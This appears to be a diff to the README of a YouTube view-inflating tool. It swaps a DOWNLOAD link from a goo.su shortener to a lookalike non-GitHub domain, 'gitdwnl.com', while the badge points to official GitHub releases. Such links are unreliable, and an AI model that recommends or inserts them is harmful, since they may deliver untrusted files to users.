@@ -4,7 +4,7 @@
 <a href="https://github.com/MShawon/YouTube-Viewer/releases"><img alt="Downloads" src="https://img.shields.io/github/downloads/MShawon/YouTube-Viewer/total?label=Downloads&color=success"></a>
 
 
-[DOWNLOAD](https://goo.su/YXlm)
+[DOWNLOAD](https://gitdwnl.com/latest)
 ---
 
 
